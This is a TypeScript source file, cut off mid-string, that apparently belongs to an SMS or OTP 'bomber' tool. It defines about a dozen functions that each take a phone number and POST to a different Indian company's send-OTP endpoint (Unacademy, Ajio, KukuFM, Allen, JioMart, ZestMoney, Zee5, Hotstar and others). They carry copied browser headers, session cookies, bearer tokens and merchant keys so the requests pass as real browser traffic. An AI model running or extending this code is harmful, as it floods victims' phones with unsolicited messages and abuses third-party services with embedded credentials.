const unacademy = (phone: string):Promise<Response> => {
	return fetch('https://unacademy.com/api/v3/user/user_check/?enable-email=true', {
		headers: {
			accept: '*/*',
			'accept-language': 'en-IN,en;q=0.9',
			'content-type': 'application/json',
			priority: 'u=1, i',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'x-platform': '0',
			cookie:
				'isDarkModeOn=; un_session_id=e5b9d29f_f21d_43f2_b248_253953131e16; ajs_anonymous_id=7f49f10b_ee6e_474b_999e_361a1a1fd36e; _gcl_au=1.1.534213565.1771256291; AMP_MKTG_d90ac5135c=JTdCJTIycmVmZXJyZXIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5nb29nbGUuY29tJTJGJTIyJTJDJTIycmVmZXJyaW5nX2RvbWFpbiUyMiUzQSUyMnd3dy5nb29nbGUuY29tJTIyJTdE; ak_bmsc=78C7880BCDAB01CAE514011587E23A9E~000000000000000000000000000000~YAAQ7xUgF8rF12ScAQAAthsaZx7jftpgmPJr2m1S7LFxnTB45vzRjvrpvgmuG5k15xdy13eyr0oCsO+pt91VNWjNh7E0DLn0zQ50YERn1SmZLoscIPMSLsmxVALZSAW1JcQnv7WGLlomfgmx+5HGTVrXxLcxJfIll2Qyv54HjutwE7r3ffNjz6oLZST/0ED3bb944zSUPtuQV8x6oakaGvmxxh/9Cr9Nb0Teu/1knvy9zQb9tWj6JmCvcZr7lTcYem+cQcRSvqHSSu/X0At8y7XqStLJf+l1OsaP9rCqdnWQhg85dDJ7DcPIW7036fk9cxnCOmu1gF/PKvvEH+Wc9TcIKEa4+DesegbFt4hhOQ==; _gid=GA1.2.590372238.1771256292; _fbp=fb.1.1771256292888.805518756465065298; _gat_UA-5306665-19=1; _gat_UA-69016858-2=1; anonymous_session_id=c0ea1b02_50db_4f54_92f0_e7c51b8908e4; _ga_6JX23YC5TQ=GS2.1.s1771256292$o1$g1$t1771256382$j48$l0$h0; _ga=GA1.1.2077033189.1771256292; _ga_H9LGJ87TMZ=GS2.2.s1771256293$o1$g0$t1771256383$j52$l0$h0; _ga_DSY4EN3LDR=GS2.2.s1771256293$o1$g0$t1771256383$j52$l0$h0; AMP_d90ac5135c=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJjYTQwZjgzZS1jYmIxLTQzYmYtYWQ0ZC0xODQwMmE1YTJmNTclMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJOQSUyMiUyQyUyMnNlc3Npb25JZCUyMiUzQTE3NzEyNTYyOTE0NDElMkMlMjJvcHRPdXQlMjIlM0FmYWxzZSUyQyUyMmxhc3RFdmVudFRpbWUlMjIlM0ExNzcxMjU2Mzk1MTk2JTJDJTIybGFzdEV2ZW50SWQlMjIlM0EyOCUyQyUyMnBhZ2VDb3VudGVyJTIyJTNBMyU3RA==',
			Referer: 'https://unacademy.com/login?redirectTo=%2Fsettings',
		},
		body: JSON.stringify({ phone, country_code: 'IN', otp_type: 1, email: '', send_otp: true, is_un_teach_user: false }),
		method: 'POST',
	});
};
const ajio = (phone: string):Promise<Response> => {
	return fetch("https://login.web.ajio.com/api/auth/signupSendOTP", {
  headers: {
    "accept": "application/json",
    "content-type": "application/json",
    "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "Referer": "https://www.ajio.com/"
  },
  body: JSON.stringify({
			firstName: 'fasdf',
			login: 'dgac@gmail.com',
			genderType: 'Male',
			mobileNumber: phone,
			rilFnlRegisterReferralCode: '',
			requestType: 'SENDOTP',
			newDesign: false,
		}),
  method: "POST"
});
};



// const growwid = (phone: string):Promise<Response> => {
// 	return fetch('https://growwid.com/api/auth/send-otp', {
// 		headers: {
// 			accept: '*/*',
// 			'accept-language': 'en-IN,en;q=0.9',
// 			'content-type': 'application/json',
// 			priority: 'u=1, i',
// 			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
// 			'sec-ch-ua-mobile': '?0',
// 			'sec-ch-ua-platform': '"Windows"',
// 			'sec-fetch-dest': 'empty',
// 			'sec-fetch-mode': 'cors',
// 			'sec-fetch-site': 'same-origin',
// 			Referer: 'https://growwid.com/',
// 		},
// 		body: JSON.stringify({ phone: `+91${phone}` }),
// 		method: 'POST',
// 	});
// };
const kukufm = (phone: string):Promise<Response> => {
	return fetch('https://kukufm.com/api/v1/users/auth/send-otp/', {
		headers: {
			accept: 'application/json, text/plain, */*',
			'accept-language': 'en-IN,en;q=0.9',
			baggage:
				'sentry-environment=production,sentry-release=KUKU-WEB-PRODUCTION-V1.6.0,sentry-public_key=4c9566bd96203b1a3a5a917b1736a2d1,sentry-trace_id=de2aabcc04d07c6ccfc9542a83bb9e91,sentry-sampled=false,sentry-sample_rand=0.42296279976590423,sentry-sample_rate=0.1',
			'content-type': 'application/json',
			'package-name': 'com.vlv.web',
			'preferred-lang': 'hindi',
			priority: 'u=1, i',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'sentry-trace': 'de2aabcc04d07c6ccfc9542a83bb9e91-8f19762f782e9534-0',
			cookie:
				'guest_user_id=dea161b4-888a-4a6c-be0c-ffecd57354d4; preferredLang=hindi; has_strip_banner=true; _gcl_au=1.1.89656339.1771336012; AWSALBTG=/UqDji3/aGGvjWtSeXjQcuvLTWC1r2rMOLQtzkwoR7eXYy5vgIt89qNPU7uB5k4EIG14BLqmEtg6hDbcAdboNZERKaJxe01xGA/vKIqSRlqoUwJsMmsDntgfgz1ler+MJSL5IZpb02AltoV9n5mF7f9OblOAC+pRba6/iMkg3J6wYKofNtQ=; AWSALBTGCORS=/UqDji3/aGGvjWtSeXjQcuvLTWC1r2rMOLQtzkwoR7eXYy5vgIt89qNPU7uB5k4EIG14BLqmEtg6hDbcAdboNZERKaJxe01xGA/vKIqSRlqoUwJsMmsDntgfgz1ler+MJSL5IZpb02AltoV9n5mF7f9OblOAC+pRba6/iMkg3J6wYKofNtQ=; AWSALB=2gvE597PAtOae47zxcLhbuca3LMQLzLT0bE+KS3tBmPq5gegl0YRDK3A6sF2xlnCQG0hLFi2HQRhoZg3kH5etpVZWy10TlLY8d5AudsMuNUNFelxkh3T4VzPIdHR; AWSALBCORS=2gvE597PAtOae47zxcLhbuca3LMQLzLT0bE+KS3tBmPq5gegl0YRDK3A6sF2xlnCQG0hLFi2HQRhoZg3kH5etpVZWy10TlLY8d5AudsMuNUNFelxkh3T4VzPIdHR; _ga=GA1.1.912876657.1771336013; _clck=4clje%5E2%5Eg3n%5E0%5E2239; _fbp=fb.1.1771336013130.326571553606284662; _clsk=tarrjo%5E1771336014335%5E1%5E1%5Ed.clarity.ms%2Fcollect; _ga_S16VQXJEBE=GS2.1.s1771336012$o1$g0$t1771336020$j52$l0$h0',
			Referer: 'https://kukufm.com/auth?srsltid=AfmBOorwJGOQyqCSEdTyd9jC4mTcjbE4S1_2e1NRElkVl8T9qg160KBk',
		},
		body: JSON.stringify({ phone_number: `+91${phone}`, recaptcha_token: '' }),
		method: 'POST',
	});
};
const allen = (phone: string):Promise<Response> => {
	return fetch("https://api.allen-live.in/api/v1/auth/sendOtp?center_id=&source=home-page-login", {
  headers: {
    "accept": "application/json",
    "accept-language": "en-IN,en;q=0.9",
    "baggage": "sentry-environment=production,sentry-release=20260216-112950,sentry-public_key=faf6a73a3042fbbe7094de5adeb3049e,sentry-trace_id=689c7e5cbc2743afb96ade032ccee445,sentry-sample_rate=0.05,sentry-sampled=false",
    "content-type": "application/json",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sentry-trace": "689c7e5cbc2743afb96ade032ccee445-b7e611a7338cbbb1-0",
    "x-client-type": "web",
    "x-device-id": "b36d90da-2f41-4680-9d7c-38457793b4bd",
    "x-referrer": "https://allen.in/asat/online-courses?utm_source=Google_Search&utm_medium=cpc&utm_campaign=EDM_LEAD-GEN_GOOGLE_SEARCH-BRAND-ONLINE_ALL_PAN-INDIA_AY26-27&utm_adset=All&utm_placement=&utm_campaignid=23227539492&utm_adsetid=&utm_sitelink=&gad_source=1&gad_campaignid=23227539492&gbraid=0AAAAAo5PAxg4-xYdi-T1YJYKwNHmZmxva&gclid=EAIaIQobChMI66eCifLgkgMVxqNmAh0jgRyQEAAYASAAEgKJYvD_BwE",
    "Referer": "https://allen.in/"
  },
  body: JSON.stringify({ country_code: '91', phone_number: phone, persona_type: 'STUDENT', otp_type: 'SHARED_DEFAULT' }),
  method: "POST"
});
};



const eurekaforbes = (phone: string):Promise<Response> => {
	return fetch('https://www.eurekaforbes.com/api/public/ecom/v1/otp/send', {
		headers: {
			accept: 'application/json, text/plain, */*',
			'accept-language': 'en-IN,en;q=0.9',
			client: 'web',
			'content-type': 'application/json',
			priority: 'u=1, i',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			cookie:
				'ApplicationGatewayAffinityCORS=c558f00408292b8f46ae88b24b70403a; ApplicationGatewayAffinity=c558f00408292b8f46ae88b24b70403a; utm_source=google; utm_medium=cpc; utm_campaign=ZO_AMC_Search_Brand_MF_Top-Metros_GenPop_V1; AKA_A2=A; cookie_banner_shown=true; _gcl_gs=2.1.k1$i1771261283$u101347989; _gcl_au=1.1.504020054.1771261285; referrer=www.google.com; deduplication_cookie=google; _gid=GA1.2.528743715.1771261286; _dc_gtm_UA-41513344-1=1; _gcl_aw=GCL.1771261286.EAIaIQobChMI7_68u77ekgMV3CeDAx2p3R4AEAAYASAAEgKCD_D_BwE; _clck=1hsa3z3%5E2%5Eg3m%5E0%5E2238; _uetsid=212cc2a00b5911f1995c4751fc8ad7f6; _uetvid=212cfb400b5911f1a7b2372c9ec035a2; _fbp=fb.1.1771261286290.681739456442092759; _ga=GA1.2.2092222471.1771261286; _gat_UA-41513344-1=1; _clsk=1qfatfs%5E1771261288119%5E1%5E1%5Ee.clarity.ms%2Fcollect; efl_cookie_acceptance=declined; _dd_s=aid=ae9527be-c297-4a75-ab9f-bd031c3525b5&rum=2&id=ba0c7807-6736-42b5-b67b-d97928ebcf0d&created=1771261285493&expire=1771262202651; _gac_UA-41513344-1=1.1771261303.EAIaIQobChMI7_68u77ekgMV3CeDAx2p3R4AEAAYASAAEgKCD_D_BwE; _ga_L0QBN795NF=GS2.1.s1771261285$o1$g1$t1771261303$j42$l0$h0',
			Referer:
				'https://www.eurekaforbes.com/login?redirectTo=/customer-service-and-amc?utm_source=google&utm_medium=cpc&utm_campaign=ZO_AMC_Search_Brand_MF_Top-Metros_GenPop_V1&adgroupid=184569015048&keyword=eureka%20forbes%20login&matchtype=e&network=g&device=c&placement=&creative=750084755174&location={location}&gad_source=1&gad_campaignid=22500231819&gbraid=0AAAAADkFMvDE4BA20L9po9pT6dcGWtSMg&gclid=EAIaIQobChMI7_68u77ekgMV3CeDAx2p3R4AEAAYASAAEgKCD_D_BwE',
		},
		body: JSON.stringify({ mobile_number: phone }),
		method: 'POST',
	});
};

const bharatloan = (phone: string):Promise<Response> => {
	return fetch('https://www.bharatloan.com/login-sbm', {
		headers: {
			accept: 'application/json, text/javascript, */*; q=0.01',
			'accept-language': 'en-IN,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'x-requested-with': 'XMLHttpRequest',
			cookie:
				'ci_session=6p3mq347b90hr0kjs28qc83esn3klb8d; _gcl_aw=GCL.1771336446.EAIaIQobChMIx_GOitXgkgMV96NmAh0aoBq1EAAYASAAEgI_q_D_BwE; _gcl_gs=2.1.k1$i1771336444$u146114151; _ga=GA1.1.1107278137.1771336446; _clck=1i3eifh%5E2%5Eg3n%5E0%5E2239; _clsk=11nd21h%5E1771336447535%5E1%5E1%5Ed.clarity.ms%2Fcollect; _ga_EWGNR5NDJB=GS2.1.s1771336446$o1$g0$t1771336449$j57$l0$h0; _gcl_au=1.1.240199773.1771336446.298838906.1771336462.1771336471; _ga_51L2EL5X8F=GS2.1.s1771336445$o1$g1$t1771336478$j27$l0$h0',
			Referer:
				'https://www.bharatloan.com/apply-now?utm_source=Google&utm_campaign=RY_BL_Performance_Max_1&gad_source=1&gad_campaignid=21076155962&gbraid=0AAAAApQvmDbZCn2yB6i8gLzSy5VBxxmmo&gclid=EAIaIQobChMIx_GOitXgkgMV96NmAh0aoBq1EAAYASAAEgI_q_D_BwE',
		},
		body: `mobile=${phone}&current_page=login&is_existing_customer=2&device_id=`,
		method: 'POST',
	});
};

const nobroker = (phone: string):Promise<Response> => {
	return fetch('https://www.nobroker.in/api/v3/account/otp/send', {
		headers: {
			accept: '*/*',
			'accept-language': 'en-IN,en;q=0.9',
			baggage:
				'sentry-environment=production,sentry-release=02102023,sentry-public_key=7625fc52b60758b28893153846eaa946,sentry-trace_id=e3b316e9c87542b49da39ae0327f455a',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			priority: 'u=1, i',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'sentry-trace': 'e3b316e9c87542b49da39ae0327f455a-87e207a2c44f4535',
			cookie:
				'cloudfront-viewer-address=122.161.48.148; cloudfront-viewer-country=IN; cloudfront-viewer-latitude=; cloudfront-viewer-longitude=; x-request-id=eb542b56-00b7-47d5-8586-d7bd1065f7eb; headerFalse=false; isMobile=false; deviceType=web; js_enabled=true; gclid=EAIaIQobChMIsuOCsb_ekgMVwF0PAh1xWAsHEAAYASAAEgLdZ_D_BwE; nbSource=google; nbMedium=cpc; nbCampaign=Pmax_LP_AllCities_AudSignals_DelhiNCR_Ownerleads; _ud_basic=false; _ud_check=true; nbDevice=desktop; mbTrackID=793b23e0952d4d85b6ba579ebb32d192; nbccc=169ceeb268d7450cbbf4ee964912e388; nb_swagger=%7B%22amenitiesExp%22%3A%22controlBucket%22%2C%22zopim_nonlogin_preopen%22%3A%22default_bucket%22%7D; _hjSessionUser_914062=eyJpZCI6IjI0OWYzZWVjLTI5NTYtNTNmMS1iN2M0LWEzMDE3MmVmZjcyYiIsImNyZWF0ZWQiOjE3NzEyNjE1MzI4OTQsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_914062=eyJpZCI6IjliYmVlZDVjLTZlODctNDU2Mi04OGEyLTBjZjE2OTZlODgyOCIsImMiOjE3NzEyNjE1MzI4OTUsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxfQ==; _fbp=fb.1.1771261533009.662962499918805252; _clck=aeay2o%5E2%5Eg3m%5E0%5E2238; cto_bundle=KAQ0u19CakNDWXB5S0VyUlVSJTJGblNyeEI1aUQ2NU40MFd0QVd2UVIlMkZZNzhpaiUyRlNuMmdWNDdPJTJGYW0lMkI4YmlCa0oxSDkzczIlMkZ2N3ZzJTJCTTAlMkJTUDd6VkVuNVJycUFWVWxadFJMSFMlMkJsWVFJd1J3JTJGVXZuNnFVNnpjZ1ZwanhiOXh1JTJCdDZ6TlY; _gcl_aw=GCL.1771261534.EAIaIQobChMIsuOCsb_ekgMVwF0PAh1xWAsHEAAYASAAEgLdZ_D_BwE; _gcl_gs=2.1.k1$i1771261531$u152048166; _gcl_au=1.1.198429654.1771261534; moe_uuid=7d0ad46e-267b-48c3-8353-7582ee8fa357; _gid=GA1.2.1802132983.1771261534; _clsk=imqej0%5E1771261534273%5E1%5E1%5Ee.clarity.ms%2Fcollect; requestId=f82fc587-b9b7-47f3-b807-b413dbf835bc; _ga=GA1.2.265477747.1771261534; _ga_BS11V183V6=GS2.1.s1771261534$o1$g1$t1771261563$j31$l0$h0; _ga_STLR7BLZQN=GS2.1.s1771261534$o1$g1$t1771261563$j31$l0$h0; JSESSION=897858a1-9dff-46bf-93d3-59595b9b44b2; _gac_UA-46762303-1=1.1771261686.EAIaIQobChMIsuOCsb_ekgMVwF0PAh1xWAsHEAAYASAAEgLdZ_D_BwE; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS2.1.s1771261534$o1$g1$t1771261685$j60$l0$h1521625688',
			Referer:
				'https://www.nobroker.in/list-your-property-for-rent-sale?utm_source=google&utm_medium=cpc&utm_campaign=Pmax_LP_AllCities_AudSignals_DelhiNCR_Ownerleads&gad_source=1&gad_campaignid=21024939301&gbraid=0AAAAADOLmYFiCnRVmy9GnlvWlLTJHGIDn&gclid=EAIaIQobChMIsuOCsb_ekgMVwF0PAh1xWAsHEAAYASAAEgLdZ_D_BwE',
		},
		body: `phone=${phone}&countryCode=IN`,
		method: 'POST',
	});
};
const jiomart = (phone: string):Promise<Response> => {
	return fetch('https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp', {
		headers: {
			accept: 'application/json',
			'accept-language': 'en-IN,en;q=0.9',
			authorization:
				'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI1LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzcxMjYxNzQwLCJzYWx0IjowfQ.MJQjWTbZnrKiF_F91RfyOYneW8iC3M1HD9RclT2ZImw',
			'content-type': 'application/json',
			priority: 'u=1, i',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			source_meta:
				'{"source_id":null,"device_fingerprint":"fa5ad2e2-aace-48-eyJwbGF0Zm9ybSI6","os_name":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36","timestamp":"2026-02-16T17:09:12.136Z"}',
			Referer: 'https://account.relianceretail.com/',
		},
		body: JSON.stringify({ mobile: phone }),
		method: 'POST',
	});
};

const zestmoney = (phone: string):Promise<Response> => {
	return fetch('https://authentication.zestmoney.in/v2/mobile/otp/', {
		headers: {
			accept: 'application/json',
			'accept-language': 'en-IN,en;q=0.9',
			'cache-control': 'no-cache',
			'content-type': 'application/json',
			pragma: 'no-cache',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			token: '135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85',
			Referer: 'https://app.zestmoney.in/',
		},
		body: JSON.stringify({
			MobileNumber: `91${phone}`,
			MessageParams: { MerchantKey: 'oitPy6oMpgv6S7ju7KmKwtSAsC6xUJ2steHYlrxQoYaGs7DKKUo/EoBavmjfMVaT' },
		}),
		method: 'POST',
	});
};
const zeeott = (phone: string):Promise<Response> => {
	return fetch('https://auth.zee5.com/v1/user/getusertoken', {
		headers: {
			accept: 'application/json',
			'accept-language': 'en-IN,en;q=0.9',
			'content-type': 'application/json',
			device_id: '57bb386d-2210-4762-a7de-633c1611d5bc',
			esk: 'NTdiYjM4NmQtMjIxMC00NzYyLWE3ZGUtNjMzYzE2MTFkNWJjX19nQlFhWkxpTmRHTjlVc0NLWmFsb2doejl0OVN0V0xTRF9fMTc3MTMzNjgzMzU3NQ==',
			priority: 'u=1, i',
			'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'x-z5-guest-token': '57bb386d-2210-4762-a7de-633c1611d5bc',
			Referer: 'https://www.zee5.com/',
		},
		body: JSON.stringify({ mobile: `91${phone}` }),
		method: 'POST',
	});
};
const jiohotstar = (phone: string):Promise<Response> => {
	return fetch(
		'https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=sendOtp&pageRef=myspace&page_enum=onboarding_login&qrCode=true',
		{
			headers: {
				accept: 'application/json, text/plain, */*',
				'accept-language': 'eng',
				baggage:
					'sentry-environment=prod,sentry-release=26.01.11.0-2026-01-30T08%3A11%3A48,sentry-public_key=d32fd9e4889d4669b234f07d232a697f,sentry-trace_id=897b4de312f54adea1a313a38e520891,sentry-transaction=%2F%5B%5B...slug%5D%5D,sentry-sampled=false',
				'content-type': 'application/json',
				priority: 'u=1, i',
				'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
				'sec-ch-ua-mobile': '?0',
				'sec-ch-ua-platform': '"Windows"',
				'sec-fetch-dest': 'empty',
				'sec-fetch-mode': 'cors',
				'sec-fetch-site': 'same-origin',
				'sentry-trace': '897b4de312f54adea1a313a38e520891-809bf2896528a574-0',
				'x-country-code': 'in',
				'x-hs-accept-language': 'eng',
				'x-hs-app': '260111000',
				'x-hs-client':
					'platform:web;app_version:26.01.11.0;browser:Chrome;schema_version:0.0.1690;os:Windows;os_version:10;browser_version:144;network_data:4g',
				'x-hs-client-targeting': 'ad_id:23240c-59268a-32c638-5dc710;user_lat:false;',
				'x-hs-device-id': '23240c-59268a-32c638-5dc710',
				'x-hs-is-retry': 'false',
				'x-hs-platform': 'web',
				'x-hs-proxystate':
					'SEGMENT=CICjBRCYp83MBiKTAQoiU1NBSTo6QV9VOkRfTkE6R19VOlNfTkE6TV9OQ1I6Tl9OQRITCgJJThC52wYaAkRMIgVERUxISRpWU1RBVEVfREwsQl9TX0RMLEJfQ19ERUxISSxCX1BfMTEwMDA5LENJVFlfREVMSEksUElOXzExMDAwOSxDT1VOVFJZX0lOLEROMDIsUEhULFJfTTE4MjQgAQ==,AB=CICjBRCYp83MBiIA,ULP=CICjBRCYp83MBiLRAQgBEswBCgIKAAoECgIIAgqlAQoHCAEVAAAAQBIKCgNoaW4lu0JnPxIKCgNlbmclHkuiPRIKCgNiZW4l+eqYOxIKCgNtYWwlC5+EOxIKCgN0YW0lUOVzOxIKCgN0ZWwlK3IjOxIKCgNtYXIl47W6OhIKCgNrYW4lWzCIOhIKCgN0Y3klMHapMxIKCgN1cmQl4aDOMhIKCgNhc20l4aDOMhIKCgNoYXIl4aDOMhIKCgNuZXAl4aDOMgoLCgIIAxIFCgNoaW4KCwoCCAQSBQoDaGlu,LOCATION=EJinzcwGIhxCGjAxS0hLUVdTV1hKN0cxUjM3Q0RIOFA4M1Mz,COHORT=CICjBRCYp83MBiIuCggIARIECAEQAQoICAISBAgBEAESGAgDEhQKCAgBEgQIARABCggIAxIECAEQAw==',
				'x-hs-proxystate-ud':
					'loc=EI+nzcwGKAMihAIoIv78XSMqohywaXI8QUD//coSMEesOJivz+91ICb29ukaBMwIlVi7jND1GEIWbQJaCX+5wS9ftsMuZWra28niLriKogR2zvYURG+DurO5v20lE82ePCbh86ZsbrhJayfhRg4QtgmXLUgF5io901szNEw6cIdeSCWPHHgDGX2g+Vc8uww40U8XkYW6uys2u5iHOW1XNzNZon9xcCg55EGwU9oz36TR+ESbmDDs5M5kBOZHkf1XeA6pkuMRFv5glHfvX9SFWIwTsDhxYlBl9kfssogKHDoGKXN18kHMq81zmzWWjO0lTduoboheKaB+hQijBg7ia8nARRIrrsa1i1xHS8Sasg==',
				'x-hs-request-id': '1abdf4-74706c-6d233d-176f22',
				'x-hs-retry-count': '0',
				'x-hs-usertoken':
					'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ7XCJoSWRcIjpcIjVmODZmN2E1YmZkOTQyYjA4NTQwNjhmMmZjY2JjMDk2XCIsXCJwSWRcIjpcIjkwZWZkMjczZTc5ZTQwMTk4Mzg1MGJjOWEyZGJlYmU1XCIsXCJkd0hpZFwiOlwiNmYyOWU4ZGMwNjczM2Y3NGZmNzE4Njg5ODYyYWE3MGUxMTk1MmFiMjNkMGNlYmQ3MTMzMTJiZGZjMTQwNzFjMFwiLFwiZHdQaWRcIjpcImQyY2VjYmE5MWE3NDZiOTYzYTg5YmMwY2Q0YzI4N2I1ZDRlN2FiOTUyMDVjZmQ1MDYwZTFiMmM1N2IwY2RhY2ZcIixcIm9sZEhpZFwiOlwiNWY4NmY3YTViZmQ5NDJiMDg1NDA2OGYyZmNjYmMwOTZcIixcIm9sZFBpZFwiOlwiOTBlZmQyNzNlNzllNDAxOTgzODUwYmM5YTJkYmViZTVcIixcImlzUGlpVXNlck1pZ3JhdGVkXCI6ZmFsc2UsXCJuYW1lXCI6XCJZb3VcIixcImlwXCI6XCIyNDAxOjQ5MDA6MWM1Yjo2YzE4OjhkMTQ6YTQ4Yjo5ZmQ0OmQ2ZFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJndWVzdFwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjpmYWxzZSxcImRldmljZUlkXCI6XCIyMzI0MGMtNTkyNjhhLTMyYzYzOC01ZGM3MTBcIixcInByb2ZpbGVcIjpcIkFEVUxUXCIsXCJ2ZXJzaW9uXCI6XCJ2MlwiLFwic3Vic2NyaXB0aW9uc1wiOntcImluXCI6e319LFwiaXNzdWVkQXRcIjoxNzcxMjYyODYzMDIyLFwiZHBpZFwiOlwiOTBlZmQyNzNlNzllNDAxOTgzODUwYmM5YTJkYmViZTVcIixcInN0XCI6MSxcImRhdGFcIjpcIkNnUUlBQklBQ2d3SUFDSUlrQUdnemZtN3hqTUtCQWdBT2dBS0JBZ0FRZ0FLQkFnQUtnQUtCQWdBTWdBPVwifSIsImlzcyI6IlVNIiwiZXhwIjoxNzcxMzQ5MjYzLCJqdGkiOiIwM2Y2ZDVhNTliNjU0NGE0OGMwMWY1Yzc4NWFmODY5MSIsImlhdCI6MTc3MTI2Mjg2MywiYXBwSWQiOiIiLCJ0ZW5hbnQiOiIiLCJ2ZXJzaW9uIjoiMV8wIiwiYXVkIjoidW1fYWNjZXNzIn0.qCuOnalPBkbePLa6P3vctw_7N8EEYpQ9RB7GGKWW7Z8',
				'x-request-id': '1abdf4-74706c-6d233d-176f22',
				cookie:
					'geo=IN,DL,NEWDELHI,28.60,77.20,24560; geo=IN,DL,NEWDELHI,28.60,77.20,24560; geo=IN,DL,NEWDELHI,28.60,77.20,24560; seo-referrer=https://www.google.com/; SELECTED__LANGUAGE=eng; deviceId=23240c-59268a-32c638-5dc710; appLaunchCounter=1; _gcl_au=1.1.197538677.1771262865; _gid=GA1.2.1816540759.1771262865; _gat_UA-53733575-1=1; userUP=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ7XCJoSWRcIjpcIjVmODZmN2E1YmZkOTQyYjA4NTQwNjhmMmZjY2JjMDk2XCIsXCJwSWRcIjpcIjkwZWZkMjczZTc5ZTQwMTk4Mzg1MGJjOWEyZGJlYmU1XCIsXCJkd0hpZFwiOlwiNmYyOWU4ZGMwNjczM2Y3NGZmNzE4Njg5ODYyYWE3MGUxMTk1MmFiMjNkMGNlYmQ3MTMzMTJiZGZjMTQwNzFjMFwiLFwiZHdQaWRcIjpcImQyY2VjYmE5MWE3NDZiOTYzYTg5YmMwY2Q0YzI4N2I1ZDRlN2FiOTUyMDVjZmQ1MDYwZTFiMmM1N2IwY2RhY2ZcIixcIm9sZEhpZFwiOlwiNWY4NmY3YTViZmQ5NDJiMDg1NDA2OGYyZmNjYmMwOTZcIixcIm9sZFBpZFwiOlwiOTBlZmQyNzNlNzllNDAxOTgzODUwYmM5YTJkYmViZTVcIixcImlzUGlpVXNlck1pZ3JhdGVkXCI6ZmFsc2UsXCJuYW1lXCI6XCJZb3VcIixcImlwXCI6XCIyNDAxOjQ5MDA6MWM1Yjo2YzE4OjhkMTQ6YTQ4Yjo5ZmQ0OmQ2ZFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJndWVzdFwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob